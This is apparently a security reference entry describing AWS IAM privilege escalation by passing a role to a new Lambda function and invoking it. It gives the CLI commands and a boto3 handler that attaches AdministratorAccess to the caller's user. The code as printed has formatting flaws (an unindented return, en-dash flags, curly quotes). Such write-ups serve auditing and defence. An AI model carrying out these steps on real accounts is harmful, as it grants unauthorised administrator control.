<title>Passing a Role to a New Lambda Function and Invoking</title>
</head><body><b>Description: </b>A user with the <u>iam:PassRole</u>, <u>lambda:CreateFunction</u>, and <u>lambda:InvokeFunction</u>&nbsp;permissions can escalate privileges by passing an existing IAM role to a new Lambda function that includes code to import the relevant AWS library to their programming language of choice, then using it perform actions of their choice. The code could then be run by invoking the function through the AWS API.<br/>
&nbsp;<br/>
An example set of commands to exploit this method might look like this:<br/>
<i>aws lambda create-function –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py</i><br/>
&nbsp;<br/>
Where the code in the python file would utilize the targeted role. An example that uses IAM to attach an administrator policy to the current user can be seen here:<br/>
&nbsp;<br/>
import boto3<br/>
def lambda_handler(event, context):<br/>
&nbsp; &nbsp; client = boto3.client(‘iam’)<br/>
&nbsp; &nbsp; response = client.attach_user_policy(UserName=’my_username’, PolicyArn=’ arn:aws:iam::aws:policy/AdministratorAccess’)<br/>
<br/>
return response<br/>
<br/>
<br/>
After this, the attacker would then invoke the Lambda function using the following command:<br/>
a<i>ws lambda invoke –function-name my_function output.txt</i><br/>
&nbsp;<br/>
Where output.txt is where the results of the invocation will be stored.<br/>
&nbsp;<br/>
<b>Potential Impact: </b>This would give a user access to the privileges associated with any Lambda service role that exists in the account, which could range from no privilege escalation to full administrator access to the account.<br/>
